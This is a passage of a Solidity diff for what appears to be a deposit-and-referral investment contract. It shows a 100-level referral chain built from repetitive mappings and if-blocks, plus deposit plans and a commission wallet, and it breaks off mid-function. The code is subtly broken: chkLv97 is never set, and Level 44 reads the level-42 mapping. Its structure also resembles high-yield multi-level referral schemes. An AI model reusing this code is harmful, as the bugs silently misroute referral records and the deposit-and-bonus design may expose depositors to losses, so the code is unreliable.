+    address chkLv57;
+    address chkLv58;
+    address chkLv59;
+    address chkLv60;
+	
+	address chkLv61;
+	address chkLv62;
+    address chkLv63;
+    address chkLv64;
+    address chkLv65;
+    address chkLv66;
+    address chkLv67;
+    address chkLv68;
+    address chkLv69;
+    address chkLv70;
+	
+	address chkLv71;
+	address chkLv72;
+    address chkLv73;
+    address chkLv74;
+    address chkLv75;
+    address chkLv76;
+    address chkLv77;
+    address chkLv78;
+    address chkLv79;
+    address chkLv80;
+	
+	address chkLv81;
+	address chkLv82;
+    address chkLv83;
+    address chkLv84;
+    address chkLv85;
+    address chkLv86;
+    address chkLv87;
+    address chkLv88;
+    address chkLv89;
+    address chkLv90;
+	
+	address chkLv91;
+	address chkLv92;
+    address chkLv93;
+    address chkLv94;
+    address chkLv95;
+    address chkLv96;
+    address chkLv97;
+    address chkLv98;
+    address chkLv99;
+    address chkLv100;
+	
+	
+    
+    struct RefUserDetail {
+        address refUserAddress;
+        uint256 refLevel;
+    }
+
+    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
+    mapping(address => uint256) public referralCount_;
+    
+	
+	mapping(address => address) internal referralLevel1Address;
+    mapping(address => address) internal referralLevel2Address;
+    mapping(address => address) internal referralLevel3Address;
+    mapping(address => address) internal referralLevel4Address;
+    mapping(address => address) internal referralLevel5Address;
+    mapping(address => address) internal referralLevel6Address;
+    mapping(address => address) internal referralLevel7Address;
+    mapping(address => address) internal referralLevel8Address;
+    mapping(address => address) internal referralLevel9Address;
+    mapping(address => address) internal referralLevel10Address;
+	
+	mapping(address => address) internal referralLevel11Address;
+    mapping(address => address) internal referralLevel12Address;
+    mapping(address => address) internal referralLevel13Address;
+    mapping(address => address) internal referralLevel14Address;
+    mapping(address => address) internal referralLevel15Address;
+    mapping(address => address) internal referralLevel16Address;
+    mapping(address => address) internal referralLevel17Address;
+    mapping(address => address) internal referralLevel18Address;
+    mapping(address => address) internal referralLevel19Address;
+    mapping(address => address) internal referralLevel20Address;
+	
+	mapping(address => address) internal referralLevel21Address;
+    mapping(address => address) internal referralLevel22Address;
+    mapping(address => address) internal referralLevel23Address;
+    mapping(address => address) internal referralLevel24Address;
+    mapping(address => address) internal referralLevel25Address;
+    mapping(address => address) internal referralLevel26Address;
+    mapping(address => address) internal referralLevel27Address;
+    mapping(address => address) internal referralLevel28Address;
+    mapping(address => address) internal referralLevel29Address;
+    mapping(address => address) internal referralLevel30Address;
+	
+	mapping(address => address) internal referralLevel31Address;
+    mapping(address => address) internal referralLevel32Address;
+    mapping(address => address) internal referralLevel33Address;
+    mapping(address => address) internal referralLevel34Address;
+    mapping(address => address) internal referralLevel35Address;
+    mapping(address => address) internal referralLevel36Address;
+    mapping(address => address) internal referralLevel37Address;
+    mapping(address => address) internal referralLevel38Address;
+    mapping(address => address) internal referralLevel39Address;
+    mapping(address => address) internal referralLevel40Address;
+	
+	mapping(address => address) internal referralLevel41Address;
+    mapping(address => address) internal referralLevel42Address;
+    mapping(address => address) internal referralLevel43Address;
+    mapping(address => address) internal referralLevel44Address;
+    mapping(address => address) internal referralLevel45Address;
+    mapping(address => address) internal referralLevel46Address;
+    mapping(address => address) internal referralLevel47Address;
+    mapping(address => address) internal referralLevel48Address;
+    mapping(address => address) internal referralLevel49Address;
+    mapping(address => address) internal referralLevel50Address;
+    
+	mapping(address => address) internal referralLevel51Address;
+    mapping(address => address) internal referralLevel52Address;
+    mapping(address => address) internal referralLevel53Address;
+    mapping(address => address) internal referralLevel54Address;
+    mapping(address => address) internal referralLevel55Address;
+    mapping(address => address) internal referralLevel56Address;
+    mapping(address => address) internal referralLevel57Address;
+    mapping(address => address) internal referralLevel58Address;
+    mapping(address => address) internal referralLevel59Address;
+    mapping(address => address) internal referralLevel60Address;
+	
+	mapping(address => address) internal referralLevel61Address;
+    mapping(address => address) internal referralLevel62Address;
+    mapping(address => address) internal referralLevel63Address;
+    mapping(address => address) internal referralLevel64Address;
+    mapping(address => address) internal referralLevel65Address;
+    mapping(address => address) internal referralLevel66Address;
+    mapping(address => address) internal referralLevel67Address;
+    mapping(address => address) internal referralLevel68Address;
+    mapping(address => address) internal referralLevel69Address;
+    mapping(address => address) internal referralLevel70Address;
+	
+	mapping(address => address) internal referralLevel71Address;
+    mapping(address => address) internal referralLevel72Address;
+    mapping(address => address) internal referralLevel73Address;
+    mapping(address => address) internal referralLevel74Address;
+    mapping(address => address) internal referralLevel75Address;
+    mapping(address => address) internal referralLevel76Address;
+    mapping(address => address) internal referralLevel77Address;
+    mapping(address => address) internal referralLevel78Address;
+    mapping(address => address) internal referralLevel79Address;
+    mapping(address => address) internal referralLevel80Address;
+	
+	mapping(address => address) internal referralLevel81Address;
+    mapping(address => address) internal referralLevel82Address;
+    mapping(address => address) internal referralLevel83Address;
+    mapping(address => address) internal referralLevel84Address;
+    mapping(address => address) internal referralLevel85Address;
+    mapping(address => address) internal referralLevel86Address;
+    mapping(address => address) internal referralLevel87Address;
+    mapping(address => address) internal referralLevel88Address;
+    mapping(address => address) internal referralLevel89Address;
+    mapping(address => address) internal referralLevel90Address;
+	
+	mapping(address => address) internal referralLevel91Address;
+    mapping(address => address) internal referralLevel92Address;
+    mapping(address => address) internal referralLevel93Address;
+    mapping(address => address) internal referralLevel94Address;
+    mapping(address => address) internal referralLevel95Address;
+    mapping(address => address) internal referralLevel96Address;
+    mapping(address => address) internal referralLevel97Address;
+    mapping(address => address) internal referralLevel98Address;
+    mapping(address => address) internal referralLevel99Address;
+    mapping(address => address) internal referralLevel100Address;
+    
+	
+
+    struct Plan {
+        uint256 time;
+        uint256 percent;
+    }
+
+    Plan[] internal plans;
+
+	struct Deposit {
+        uint8 plan;
+		uint256 amount;
+		uint256 start;
+	}
+
+	struct User {
+		Deposit[] deposits;
+		uint256 checkpoint;
+		address referrer;
+		uint256[10] levels;
+		uint256 bonus;
+		uint256 totalBonus;
+		uint256 seedincome;
+		uint256 withdrawn;
+		uint256 withdrawnseed;
+	}
+	
+	
+	
+
+	mapping (address => User) internal users;
+
+	bool public started;
+	address payable public commissionWallet;
+
+	event Newbie(address user);
+	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
+	event Withdrawn(address indexed user, uint256 amount);
+	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
+	event SeedIncome(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
+	event FeePayed(address indexed user, uint256 totalAmount);
+
+	constructor(address payable wallet) public {
+		require(!isContract(wallet));
+		commissionWallet = wallet;
+
+        plans.push(Plan(10000, 50));
+		plans.push(Plan(30, 75));
+		plans.push(Plan(20, 100));
+       
+	}
+	
+	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
+        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
+    }
+    
+    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
+        referralCount_[senderAddress]++;
+        uint dataId = referralCount_[senderAddress];
+        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
+        RefUser[senderAddress][dataId].refLevel = refLevel;
+    }
+
+    
+	
+	
+	 function distributeRef(address _referredBy,address _sender, bool _newReferral) internal {
+       
+          address _customerAddress        = _sender;
+        // Level 1
+        referralLevel1Address[_customerAddress]                     = _referredBy;
+        if(_newReferral == true) {
+            addDownlineRef(_referredBy, _customerAddress, 1);
+        }
+        
+        chkLv2                          = referralLevel1Address[_referredBy];
+        chkLv3                          = referralLevel2Address[_referredBy];
+        chkLv4                          = referralLevel3Address[_referredBy];
+        chkLv5                          = referralLevel4Address[_referredBy];
+        chkLv6                          = referralLevel5Address[_referredBy];
+        chkLv7                          = referralLevel6Address[_referredBy];
+        chkLv8                          = referralLevel7Address[_referredBy];
+        chkLv9                          = referralLevel8Address[_referredBy];
+        chkLv10                         = referralLevel9Address[_referredBy];
+		
+		chkLv11                          = referralLevel10Address[_referredBy];
+	    chkLv12                          = referralLevel11Address[_referredBy];
+        chkLv13                          = referralLevel12Address[_referredBy];
+        chkLv14                          = referralLevel13Address[_referredBy];
+        chkLv15                          = referralLevel14Address[_referredBy];
+        chkLv16                          = referralLevel15Address[_referredBy];
+        chkLv17                          = referralLevel16Address[_referredBy];
+        chkLv18                          = referralLevel17Address[_referredBy];
+        chkLv19                          = referralLevel18Address[_referredBy];
+        chkLv20                          = referralLevel19Address[_referredBy];
+		
+	    chkLv21                          = referralLevel20Address[_referredBy];
+	    chkLv22                          = referralLevel21Address[_referredBy];
+        chkLv23                          = referralLevel22Address[_referredBy];
+        chkLv24                          = referralLevel23Address[_referredBy];
+        chkLv25                          = referralLevel24Address[_referredBy];
+        chkLv26                          = referralLevel25Address[_referredBy];
+        chkLv27                          = referralLevel26Address[_referredBy];
+        chkLv28                          = referralLevel27Address[_referredBy];
+        chkLv29                          = referralLevel28Address[_referredBy];
+        chkLv30                          = referralLevel29Address[_referredBy];
+		
+		chkLv31                          = referralLevel30Address[_referredBy];
+	    chkLv32                          = referralLevel31Address[_referredBy];
+        chkLv33                          = referralLevel32Address[_referredBy];
+        chkLv34                          = referralLevel33Address[_referredBy];
+        chkLv35                          = referralLevel34Address[_referredBy];
+        chkLv36                          = referralLevel35Address[_referredBy];
+        chkLv37                          = referralLevel36Address[_referredBy];
+        chkLv38                          = referralLevel37Address[_referredBy];
+        chkLv39                          = referralLevel38Address[_referredBy];
+        chkLv40                          = referralLevel39Address[_referredBy];
+		
+		chkLv41                          = referralLevel40Address[_referredBy];
+	    chkLv42                          = referralLevel41Address[_referredBy];
+        chkLv43                          = referralLevel42Address[_referredBy];
+        chkLv44                          = referralLevel43Address[_referredBy];
+        chkLv45                          = referralLevel44Address[_referredBy];
+        chkLv46                          = referralLevel45Address[_referredBy];
+        chkLv47                          = referralLevel46Address[_referredBy];
+        chkLv48                          = referralLevel47Address[_referredBy];
+        chkLv49                          = referralLevel48Address[_referredBy];
+        chkLv50                          = referralLevel49Address[_referredBy];
+		
+		chkLv51                          = referralLevel50Address[_referredBy];
+	    chkLv52                          = referralLevel51Address[_referredBy];
+        chkLv53                          = referralLevel52Address[_referredBy];
+        chkLv54                          = referralLevel53Address[_referredBy];
+        chkLv55                          = referralLevel54Address[_referredBy];
+        chkLv56                          = referralLevel55Address[_referredBy];
+        chkLv57                          = referralLevel56Address[_referredBy];
+        chkLv58                          = referralLevel57Address[_referredBy];
+        chkLv59                          = referralLevel58Address[_referredBy];
+        chkLv60                          = referralLevel59Address[_referredBy];
+		
+		chkLv61                          = referralLevel60Address[_referredBy];
+	    chkLv62                          = referralLevel61Address[_referredBy];
+        chkLv63                          = referralLevel62Address[_referredBy];
+        chkLv64                          = referralLevel63Address[_referredBy];
+        chkLv65                          = referralLevel64Address[_referredBy];
+        chkLv66                          = referralLevel65Address[_referredBy];
+        chkLv67                          = referralLevel66Address[_referredBy];
+        chkLv68                          = referralLevel67Address[_referredBy];
+        chkLv69                          = referralLevel68Address[_referredBy];
+        chkLv70                          = referralLevel69Address[_referredBy];
+		
+		chkLv71                          = referralLevel70Address[_referredBy];
+	    chkLv72                          = referralLevel71Address[_referredBy];
+        chkLv73                          = referralLevel72Address[_referredBy];
+        chkLv74                          = referralLevel73Address[_referredBy];
+        chkLv75                          = referralLevel74Address[_referredBy];
+        chkLv76                          = referralLevel75Address[_referredBy];
+        chkLv77                          = referralLevel76Address[_referredBy];
+        chkLv78                          = referralLevel77Address[_referredBy];
+        chkLv79                          = referralLevel78Address[_referredBy];
+        chkLv80                          = referralLevel79Address[_referredBy];
+		
+        chkLv81                          = referralLevel80Address[_referredBy];
+	    chkLv82                          = referralLevel81Address[_referredBy];
+        chkLv83                          = referralLevel82Address[_referredBy];
+        chkLv84                          = referralLevel83Address[_referredBy];
+        chkLv85                          = referralLevel84Address[_referredBy];
+        chkLv86                          = referralLevel85Address[_referredBy];
+        chkLv87                          = referralLevel86Address[_referredBy];
+        chkLv88                          = referralLevel87Address[_referredBy];
+        chkLv89                          = referralLevel88Address[_referredBy];
+        chkLv90                          = referralLevel89Address[_referredBy];
+		
+		chkLv91                          = referralLevel90Address[_referredBy];
+	    chkLv92                          = referralLevel91Address[_referredBy];
+        chkLv93                          = referralLevel92Address[_referredBy];
+        chkLv94                          = referralLevel93Address[_referredBy];
+        chkLv95                          = referralLevel94Address[_referredBy];
+        chkLv96                          = referralLevel95Address[_referredBy];
+        chkLv98                          = referralLevel97Address[_referredBy];
+        chkLv99                          = referralLevel98Address[_referredBy];
+        chkLv100                         = referralLevel99Address[_referredBy];
+		
+		
+		
+		
+		
+		
+        // Level 2
+        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
+            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
+            }
+        }
+        
+        // Level 3
+        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
+            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
+            }
+        }
+        
+        // Level 4
+        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
+            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
+            }
+        }
+        
+        // Level 5
+        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
+            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
+            }
+        }
+        
+        // Level 6
+        if(chkLv6 != 0x0000000000000000000000000000000000000000) {
+            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
+            }
+        }
+        
+        // Level 7
+        if(chkLv7 != 0x0000000000000000000000000000000000000000) {
+            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
+           if(_newReferral == true) {
+                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
+            }
+        }
+        
+        // Level 8
+        if(chkLv8 != 0x0000000000000000000000000000000000000000) {
+            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
+            }
+        }
+        
+        // Level 9
+        if(chkLv9 != 0x0000000000000000000000000000000000000000) {
+            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
+            }
+        }
+        
+        // Level 10
+        if(chkLv10 != 0x0000000000000000000000000000000000000000) {
+            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
+            }
+        }
+		
+		// Level 11
+        if(chkLv11 != 0x0000000000000000000000000000000000000000) {
+            referralLevel11Address[_customerAddress]                    = referralLevel10Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel10Address[_referredBy], _customerAddress, 11);
+            }
+        }
+		
+		 // Level 12
+        if(chkLv12 != 0x0000000000000000000000000000000000000000) {
+            referralLevel12Address[_customerAddress]                    = referralLevel11Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel11Address[_referredBy], _customerAddress, 12);
+            }
+        }
+		
+		 // Level 13
+        if(chkLv13 != 0x0000000000000000000000000000000000000000) {
+            referralLevel13Address[_customerAddress]                    = referralLevel12Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel12Address[_referredBy], _customerAddress, 13);
+            }
+        }
+		
+		 // Level 14
+        if(chkLv14 != 0x0000000000000000000000000000000000000000) {
+            referralLevel14Address[_customerAddress]                    = referralLevel13Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel13Address[_referredBy], _customerAddress, 14);
+            }
+        }
+		
+		 // Level 15
+        if(chkLv15 != 0x0000000000000000000000000000000000000000) {
+            referralLevel15Address[_customerAddress]                    = referralLevel14Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel14Address[_referredBy], _customerAddress, 15);
+            }
+        }
+		
+		 // Level 16
+        if(chkLv16 != 0x0000000000000000000000000000000000000000) {
+            referralLevel16Address[_customerAddress]                    = referralLevel15Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel15Address[_referredBy], _customerAddress, 16);
+            }
+        }
+		
+		// Level 17
+        if(chkLv17 != 0x0000000000000000000000000000000000000000) {
+            referralLevel17Address[_customerAddress]                    = referralLevel16Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel16Address[_referredBy], _customerAddress, 17);
+            }
+        }
+		
+		// Level 18
+        if(chkLv18 != 0x0000000000000000000000000000000000000000) {
+            referralLevel18Address[_customerAddress]                    = referralLevel17Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel17Address[_referredBy], _customerAddress, 18);
+            }
+        }
+		
+		// Level 19
+        if(chkLv19 != 0x0000000000000000000000000000000000000000) {
+            referralLevel19Address[_customerAddress]                    = referralLevel18Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel18Address[_referredBy], _customerAddress, 19);
+            }
+        }
+		
+		// Level 20
+        if(chkLv20 != 0x0000000000000000000000000000000000000000) {
+            referralLevel20Address[_customerAddress]                    = referralLevel19Address[_referredBy];
+            if(_newReferral == true) {
+                addDownlineRef(referralLevel19Address[_referredBy], _customerAddress, 20);
+            }
+        }
+		
+		// Level 21
+		if(chkLv21 != 0x0000000000000000000000000000000000000000) {
+			referralLevel21Address[_customerAddress]                    = referralLevel20Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel20Address[_referredBy], _customerAddress, 21);
+			}
+		}
+
+		// Level 22
+		if(chkLv22 != 0x0000000000000000000000000000000000000000) {
+			referralLevel22Address[_customerAddress]                    = referralLevel21Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel21Address[_referredBy], _customerAddress, 22);
+			}
+		}
+
+		// Level 23
+		if(chkLv23 != 0x0000000000000000000000000000000000000000) {
+			referralLevel23Address[_customerAddress]                    = referralLevel22Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel22Address[_referredBy], _customerAddress, 23);
+			}
+		}
+
+		// Level 24
+		if(chkLv24 != 0x0000000000000000000000000000000000000000) {
+			referralLevel24Address[_customerAddress]                    = referralLevel23Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel23Address[_referredBy], _customerAddress, 24);
+			}
+		}
+
+		// Level 25
+		if(chkLv25 != 0x0000000000000000000000000000000000000000) {
+			referralLevel25Address[_customerAddress]                    = referralLevel24Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel24Address[_referredBy], _customerAddress, 25);
+			}
+		}
+
+		// Level 26
+		if(chkLv26 != 0x0000000000000000000000000000000000000000) {
+			referralLevel26Address[_customerAddress]                    = referralLevel25Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel25Address[_referredBy], _customerAddress, 26);
+			}
+		}
+
+		// Level 27
+		if(chkLv27 != 0x0000000000000000000000000000000000000000) {
+			referralLevel27Address[_customerAddress]                    = referralLevel26Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel26Address[_referredBy], _customerAddress, 27);
+			}
+		}
+
+		// Level 28
+		if(chkLv28 != 0x0000000000000000000000000000000000000000) {
+			referralLevel28Address[_customerAddress]                    = referralLevel27Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel27Address[_referredBy], _customerAddress, 28);
+			}
+		}
+
+		// Level 29
+		if(chkLv29 != 0x0000000000000000000000000000000000000000) {
+			referralLevel29Address[_customerAddress]                    = referralLevel28Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel28Address[_referredBy], _customerAddress, 29);
+			}
+		}
+
+		// Level 30
+		if(chkLv30 != 0x0000000000000000000000000000000000000000) {
+			referralLevel30Address[_customerAddress]                    = referralLevel29Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel29Address[_referredBy], _customerAddress, 30);
+			}
+		}
+		
+		// Level 31
+		if(chkLv31 != 0x0000000000000000000000000000000000000000) {
+			referralLevel31Address[_customerAddress]                    = referralLevel30Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel30Address[_referredBy], _customerAddress, 31);
+			}
+		}
+
+		// Level 32
+		if(chkLv32 != 0x0000000000000000000000000000000000000000) {
+			referralLevel32Address[_customerAddress]                    = referralLevel31Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel31Address[_referredBy], _customerAddress, 32);
+			}
+		}
+
+		// Level 33
+		if(chkLv33 != 0x0000000000000000000000000000000000000000) {
+			referralLevel33Address[_customerAddress]                    = referralLevel32Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel32Address[_referredBy], _customerAddress, 33);
+			}
+		}
+
+		// Level 34
+		if(chkLv34 != 0x0000000000000000000000000000000000000000) {
+			referralLevel34Address[_customerAddress]                    = referralLevel33Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel33Address[_referredBy], _customerAddress, 34);
+			}
+		}
+
+		// Level 35
+		if(chkLv35 != 0x0000000000000000000000000000000000000000) {
+			referralLevel35Address[_customerAddress]                    = referralLevel34Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel34Address[_referredBy], _customerAddress, 35);
+			}
+		}
+
+		// Level 36
+		if(chkLv36 != 0x0000000000000000000000000000000000000000) {
+			referralLevel36Address[_customerAddress]                    = referralLevel35Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel35Address[_referredBy], _customerAddress, 36);
+			}
+		}
+
+		// Level 37
+		if(chkLv37 != 0x0000000000000000000000000000000000000000) {
+			referralLevel37Address[_customerAddress]                    = referralLevel36Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel36Address[_referredBy], _customerAddress, 37);
+			}
+		}
+
+		// Level 38
+		if(chkLv38 != 0x0000000000000000000000000000000000000000) {
+			referralLevel38Address[_customerAddress]                    = referralLevel37Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel37Address[_referredBy], _customerAddress, 38);
+			}
+		}
+
+		// Level 39
+		if(chkLv39 != 0x0000000000000000000000000000000000000000) {
+			referralLevel39Address[_customerAddress]                    = referralLevel38Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel38Address[_referredBy], _customerAddress, 39);
+			}
+		}
+
+		// Level 40
+		if(chkLv40 != 0x0000000000000000000000000000000000000000) {
+			referralLevel40Address[_customerAddress]                    = referralLevel39Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel39Address[_referredBy], _customerAddress, 40);
+			}
+		}
+		// Level 41
+		if(chkLv41 != 0x0000000000000000000000000000000000000000) {
+			referralLevel41Address[_customerAddress]                    = referralLevel40Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel40Address[_referredBy], _customerAddress, 41);
+			}
+		}
+
+		// Level 42
+		if(chkLv42 != 0x0000000000000000000000000000000000000000) {
+			referralLevel42Address[_customerAddress]                    = referralLevel41Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel41Address[_referredBy], _customerAddress, 42);
+			}
+		}
+		
+			// Level 43
+		if(chkLv43 != 0x0000000000000000000000000000000000000000) {
+			referralLevel43Address[_customerAddress]                    = referralLevel42Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel42Address[_referredBy], _customerAddress, 43);
+			}
+		}
+
+		// Level 44
+		if(chkLv44 != 0x0000000000000000000000000000000000000000) {
+			referralLevel44Address[_customerAddress]                    = referralLevel42Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel42Address[_referredBy], _customerAddress, 44);
+			}
+		}
+
+
+
+		// Level 45
+		if(chkLv45 != 0x0000000000000000000000000000000000000000) {
+			referralLevel45Address[_customerAddress]                    = referralLevel44Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel44Address[_referredBy], _customerAddress, 45);
+			}
+		}
+
+		// Level 46
+		if(chkLv46 != 0x0000000000000000000000000000000000000000) {
+			referralLevel46Address[_customerAddress]                    = referralLevel45Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel45Address[_referredBy], _customerAddress, 46);
+			}
+		}
+
+		// Level 47
+		if(chkLv47 != 0x0000000000000000000000000000000000000000) {
+			referralLevel47Address[_customerAddress]                    = referralLevel46Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel46Address[_referredBy], _customerAddress, 47);
+			}
+		}
+
+		// Level 48
+		if(chkLv48 != 0x0000000000000000000000000000000000000000) {
+			referralLevel48Address[_customerAddress]                    = referralLevel47Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel47Address[_referredBy], _customerAddress, 48);
+			}
+		}
+
+		// Level 49
+		if(chkLv49 != 0x0000000000000000000000000000000000000000) {
+			referralLevel49Address[_customerAddress]                    = referralLevel48Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel48Address[_referredBy], _customerAddress, 49);
+			}
+		}
+
+		// Level 50
+		if(chkLv50 != 0x0000000000000000000000000000000000000000) {
+			referralLevel50Address[_customerAddress]                    = referralLevel49Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel49Address[_referredBy], _customerAddress, 50);
+			}
+		}
+		
+
+			
+			
+		// Level 51
+		if(chkLv51 != 0x0000000000000000000000000000000000000000) {
+			referralLevel51Address[_customerAddress]                    = referralLevel50Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel50Address[_referredBy], _customerAddress, 51);
+			}
+		}
+			
+		
+		// Level 52
+		if(chkLv52 != 0x0000000000000000000000000000000000000000) {
+			referralLevel52Address[_customerAddress]                    = referralLevel51Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel51Address[_referredBy], _customerAddress, 52);
+			}
+		}
+		
+		// Level 53
+		if(chkLv53 != 0x0000000000000000000000000000000000000000) {
+			referralLevel53Address[_customerAddress]                    = referralLevel52Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel52Address[_referredBy], _customerAddress, 53);
+			}
+		}
+		
+		// Level 54
+		if(chkLv54 != 0x0000000000000000000000000000000000000000) {
+			referralLevel54Address[_customerAddress]                    = referralLevel53Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel53Address[_referredBy], _customerAddress, 54);
+			}
+		}
+		
+		
+		// Level 55
+		if(chkLv55 != 0x0000000000000000000000000000000000000000) {
+			referralLevel55Address[_customerAddress]                    = referralLevel54Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel54Address[_referredBy], _customerAddress, 55);
+			}
+		}
+		
+		// Level 56
+		if(chkLv56 != 0x0000000000000000000000000000000000000000) {
+			referralLevel56Address[_customerAddress]                    = referralLevel55Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel55Address[_referredBy], _customerAddress, 56);
+			}
+		}
+		
+		
+		// Level 57
+		if(chkLv57 != 0x0000000000000000000000000000000000000000) {
+			referralLevel57Address[_customerAddress]                    = referralLevel56Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel56Address[_referredBy], _customerAddress, 57);
+			}
+		}
+		
+		// Level 58
+		if(chkLv58 != 0x0000000000000000000000000000000000000000) {
+			referralLevel58Address[_customerAddress]                    = referralLevel57Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel57Address[_referredBy], _customerAddress, 58);
+			}
+		}
+		
+		
+		// Level 59
+		if(chkLv59 != 0x0000000000000000000000000000000000000000) {
+			referralLevel59Address[_customerAddress]                    = referralLevel58Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel58Address[_referredBy], _customerAddress, 59);
+			}
+		}
+		
+		
+		// Level 60
+		if(chkLv60 != 0x0000000000000000000000000000000000000000) {
+			referralLevel60Address[_customerAddress]                    = referralLevel59Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel59Address[_referredBy], _customerAddress, 60);
+			}
+		}
+		
+		// Level 61
+		if(chkLv61 != 0x0000000000000000000000000000000000000000) {
+			referralLevel61Address[_customerAddress]                    = referralLevel60Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel60Address[_referredBy], _customerAddress, 61);
+			}
+		}
+		
+		// Level 62
+		if(chkLv62 != 0x0000000000000000000000000000000000000000) {
+			referralLevel62Address[_customerAddress]                    = referralLevel61Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel61Address[_referredBy], _customerAddress, 62);
+			}
+		}
+			
+			
+		// Level 63
+		if(chkLv63 != 0x0000000000000000000000000000000000000000) {
+			referralLevel63Address[_customerAddress]                    = referralLevel62Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel62Address[_referredBy], _customerAddress, 63);
+			}
+		}
+
+		// Level 64
+		if(chkLv64 != 0x0000000000000000000000000000000000000000) {
+			referralLevel64Address[_customerAddress]                    = referralLevel63Address[_referredBy];
+			if(_newReferral == true) {
+				addDownlineRef(referralLevel63Address[_referredBy], _customerAddress, 64);
+			}
+		}
+		
+		// Level 65
